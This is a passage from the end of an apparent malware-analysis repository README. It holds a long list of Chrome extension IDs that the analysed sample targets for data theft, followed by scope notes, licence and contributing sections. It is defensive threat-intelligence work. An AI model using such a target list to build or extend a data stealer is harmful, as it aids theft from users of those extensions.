lccbohhgfkdikahanoclbdmaolidjdfl  ldcihfaojdpmhjkhioilfjjckehehddg
lfmmjkfllhmfmkcobchabopkcefjkoip  lgmpcpglpngdoalbgeoldeajfclnhafa
lkpmkhpnhknhmibgnmmhdhgdilepfghe  llakdhpogpnejheknjbhbadoaomejgbi
lmkncnlpeipongihbffpljgehamdebgi  lnnnmfcpbkafcpgdilckhmhbkkbpkmid
loinekcabhlmhjjbocijdoimmejangoa  lpfcbjknijpeeillifnkikgncikgfhdo
lpilbniiabackdjcionkobglmddfbcjo  magbanejlegnbcppjljfhnmfmghialkl
mapbhaebnddapnmifbbkgeedkeplgjmf  mcbigmjiafegjnnogedioegffbooigli
mcohilncbfahbmgdjkbpemcciiolgcge  mdjjoodeandllhefapdpnffjolechflh
mdjmfdffdcmnoblignmgpommbefadffd  mdnaglckomeedfbogeajfajofmfgpoae
mfgccjchihfkkindfppnaooecgfneiii  mfiealgchgibibbamfjebflnfjihfedk
mgbfflhghaohmaecmaggieniidindaoc  mgfbabcnedcejkfibpafadgkhmkifhbd
mgffkfbidihjpoaomajlbgchddlicgpn  mjgkpalnahacmhkikiommfiomhjipgjn
mkchoaaiifodcflmbaphdgeidocajadp  mkjjflkhdddfjhonakofipfojoepfndk
mkpegjkblkkefacfnmkajcjmabijhclg  mlbnicldlpdimbjdcncnklfempedeipj
mlhakagmgkmonhdonhkpjeebfphligng  mmmjbcfofconkannjonfmjjajpllddbg
mnfifefkajgofkcjkemidiaecocnkjeh  mnnkpffndmickbiakofclnpoiajlegmg
modjfdjcodmehnpccdjngmdfajggaoeh  nanjmdknhkinifnkgdcggcfnhdaammmj
nankopfjhdflikcokhgohiaoehnjfako  nbdhibgjnjpnkajaghbffjbkcgljfgdi
nbdpmlhambbdkhkmbfpljckjcmgibalo  nebnhfamliijlghikdgcigoebonmoibm
nfaepmamdapehcbedhejbjcpnlcldodi  nfinomegcaccbhchhgflladpfbajihdf
ngakogceekkandcbkniokoghdckjhhok  nglnaekfdaelelcaokeemlnopjhekdkj
nhlnehondigmgckngjomcpcefcdplmgc  nhnkbkgjikgcigadomkphalanndcapjk
niiaamnmgebpeejeemoifgdndgeaekhe  njoljnomkdoakfphjbapdopdcneceeaf
nkbihfbeogaeaoehlefnkodbefgpgknn  nkddgncdjgjfcddamfgcmfnlhccnimig
nknhiehlklippafakaeklbeglecifhad  nlbmnnijcnlegkjjpcfjclmcfggfefdm
nlgnepoeokdfodgjkjiblkadkjbdfmgd  nopnfnlbinpfoihclomelncopjiioain
nphplpgoakhhjchkkhmiggakijnkhfnd  ocjdpmoallmgmjbbogfiiaofphbjgchh
ocjobpilfplciaddcbafabcegbilnbnb  ocmccklecaalljlflmclidjeclpcpdim
odbfpeeihdkbihmopkbjmoonfanlbfcl  oehdbmfbnjnpahadljbdcjndmepmgjgl
ofeeamlegilfbjlgbephmdhchpblfigo  ohjgojhmjldjfiningdelbffpnddmiphh
ojggmchlghnjlapmfbnjholfjkiidbch  oklkeijlcjcpbokmkmnjepjhnggkfkcl
oldojieloelkkfeacfinhcngmbkepnlm  olgpchjlegmakkhfbahgnjojlefnealp
olkbchllhcflpbjfgagahpkjnjioiedg  omaabbefbmiijedngplfjmnooppbclkk
omajpeaffjgmlpmhbfdjepdejoemifpe  onhogfjeacnfoofkfgppdlbmlmnplgbn
ooiepdgjjnhcmlaobfinbomgebfgablh  ookjlbkiijinhpmnjffcofjonbfbgaoc
opcgpfmipidbgpenhmajoajpbobppdil  oponnjpnbhdmohlkonljdfhbeibljfoa
oppceojapmdmhpnmjpballbbdclocdhj  panpgppehdchfphcigocleabcmcgfoca
pdadjkfkgcafgbceimcpbkalnfnepbnk  pdgbckgdncnhihllonhnjbdoighgpimk
pdliaogehgdbhbnmkklieghmmjkpigpa  pdlocjdlejekdbpghdcmedeacpkfiiof
peigonhbenoefaeplkpalmafieegnapj  penjlddjkjgpnkllboccdgccekpkcbin
pgiaagfkgcbnmiiolekcfmljdagdhlcm  pgojdfajgcjjpjnbpfaelnpnjocakldb
phkbamefinggmakgklpkljjmgibohnba  pmmbeeacafhbpgmlkacpadheejlhhkbf
pnndplcbkakcplkjnolgbkdgjikjednm  pnphepacpjpklpbacfmebicbgndobakn
pocmplpaccanhmnllbbkpgfliimjljgo  pogabilnghhbafaheaepaaeopjpleimd
ppbibelpcjmhbdihakflkdcoccbgbkpo  ppdadbejkmjnefldpcdjhnkpbjkikoip
```

---

## Scope and limitations

- This repository documents **static analysis and decryption** of a single malware sample and its embedded configuration.
- Campaign attribution is **analytic**, based on recovered infrastructure and TTP overlap; it is **not** a law-enforcement attribution statement.
- The listed Chrome extension IDs identify **legitimate extensions targeted for data theft**, not malicious extensions.
- Detection rules should be **validated and tuned** in the destination environment before production deployment.
- The STIX bundle follows STIX 2.1 but uses simplified IDs for readability; re-generate UUIDs before importing into production CTI platforms if deconfliction is required.

---

## Release history

See [`CHANGELOG.md`](CHANGELOG.md) for versioned updates.

## Contributing

See [`CONTRIBUTING.md`](CONTRIBUTING.md) for guidelines, issue templates, and the PR checklist.

## License

Analysis text and scripts are released under the [MIT License](LICENSE). IOC lists and threat-intelligence content are provided for defensive purposes; reuse in commercial products is permitted under the license terms.

---

*Independent reverse engineering in a sandboxed environment. Encrypted configuration was recovered by static analysis and per-helper CPU emulation. See [`scripts/decrypt_all.py`](scripts/decrypt_all.py) and [`SECURITY.md`](SECURITY.md).*
